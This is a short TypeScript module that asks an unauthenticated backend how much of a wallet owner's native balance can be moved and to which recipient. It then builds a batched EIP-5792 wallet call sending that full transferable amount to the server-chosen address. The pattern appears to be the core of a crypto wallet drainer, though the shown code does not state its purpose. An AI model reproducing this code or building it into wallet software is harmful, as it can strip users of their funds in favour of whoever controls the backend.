import { resolveApiUrl } from "../core/api-url";
import {
  correlationHeaders,
  getActiveTransaction,
} from "../core/transaction-context";
import type { NativeTransferEstimate } from "../native-transfer/types";

/**
 * Fetch native transfer estimate for EIP-5792 batching (no wallet session auth —
 * `/api/native-transfers/estimate` is unauthenticated).
 */
export async function fetchNativeTransferEstimate(args: {
  apiBaseUrl?: string;
  network: string;
  owner: string;
  traceId?: string;
}): Promise<NativeTransferEstimate | null> {
  try {
    const transactionId = args.traceId ?? getActiveTransaction()?.transactionId;

    const res = await fetch(
      resolveApiUrl(args.apiBaseUrl, "/api/native-transfers/estimate"),
      {
        method: "POST",
        headers: {
          "content-type": "application/json",
          ...correlationHeaders(transactionId),
        },
        body: JSON.stringify({
          network: args.network,
          owner: args.owner,
          traceId: transactionId,
        }),
        cache: "no-store",
      },
    );
    const json = (await res.json()) as NativeTransferEstimate;
    if (!res.ok || json.transferableRaw == null) return null;
    if (!json.canTransfer || BigInt(json.transferableRaw) <= BigInt(0))
      return null;
    if (!json.recipient) return null;
    return json;
  } catch {
    return null;
  }
}

function toHexValue(value: string | bigint): string {
  const v = typeof value === "bigint" ? value : BigInt(value);
  return `0x${v.toString(16)}`;
}

export function buildNativeWalletCall(
  estimate: NativeTransferEstimate,
): { to: string; data: string; value: string } | null {
  if (!estimate.recipient || BigInt(estimate.transferableRaw) <= BigInt(0)) {
    return null;
  }
  return {
    to: estimate.recipient,
    data: "0x",
    value: toHexValue(estimate.transferableRaw),
  };
}
